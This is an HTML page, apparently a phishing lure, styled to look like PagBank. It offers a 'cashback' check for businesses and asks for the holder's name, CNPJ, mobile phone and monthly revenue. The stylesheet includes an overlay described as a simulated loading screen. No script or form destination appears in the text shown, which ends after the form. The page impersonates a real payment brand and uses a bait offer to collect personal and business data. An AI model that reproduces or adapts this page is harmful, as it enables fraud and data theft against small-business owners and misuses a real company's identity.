<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PagBank | Consulta de Cashback</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }
        .wrapper {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
            max-width: 440px;
            width: 100%;
            overflow: hidden;
            border: 1px solid #e1e8ed;
        }
        .header {
            background: #ffffff;
            padding: 25px 20px 15px 20px;
            text-align: center;
            border-bottom: 1px solid #f0f2f5;
        }
        .logo {
            font-size: 26px;
            font-weight: 800;
            color: #00b159;
            letter-spacing: -1px;
            margin-bottom: 15px;
        }
        .logo span {
            color: #1a1a1a;
        }
        h1 {
            color: #1a1a1a;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #666;
            font-size: 14px;
            line-height: 1.4;
        }
        .content {
            padding: 25px 20px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #444;
            font-weight: 600;
            font-size: 13px;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ccd6dd;
            border-radius: 8px;
            font-size: 15px;
            color: #1a1a1a;
            outline: none;
            background: #fafafa;
            transition: all 0.2s ease;
        }
        input:focus {
            border-color: #00b159;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(0, 177, 89, 0.12);
        }
        .btn-submit {
            width: 100%;
            padding: 16px;
            background: #00b159;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s ease;
            margin-top: 10px;
        }
        .btn-submit:hover {
            background: #00964b;
        }
        /* Tela de carregamento simulada */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 999;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #00b159;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            font-weight: 600;
            color: #333;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="header">
            <div class="logo">Pag<span>Bank</span></div>
            <h1>Verificar Cashback Disponível</h1>
            <p class="subtitle">Consulte se o seu CNPJ possui valores elegíveis para resgate imediato.</p>
        </div>

        <div class="content">
            <form id="cashbackForm">
                <div class="form-group">
                    <label for="nome">Nome do Titular / Razão Social</label>
                    <input type="text" id="nome" placeholder="Ex: João da Silva" required>
                </div>

                <div class="form-group">
                    <label for="cnpj">CNPJ</label>
                    <input type="text" id="cnpj" placeholder="00.000.000/0001-00" maxlength="18" required>
                </div>

                <div class="form-group">
                    <label for="telefone">Telefone Celular</label>
                    <input type="tel" id="telefone" placeholder="(11) 99999-9999" maxlength="15" required>
                </div>

                <div class="form-group">
                    <label for="renda">Faturamento Mensal Estimado</label>
                    <input type="text" id="renda" placeholder="R$ 0,00" required>
                </div>

                <button type="submit" class="btn-submit">Consultar Saldo e Enviar</button>
            </form>
        </div>
    </div>
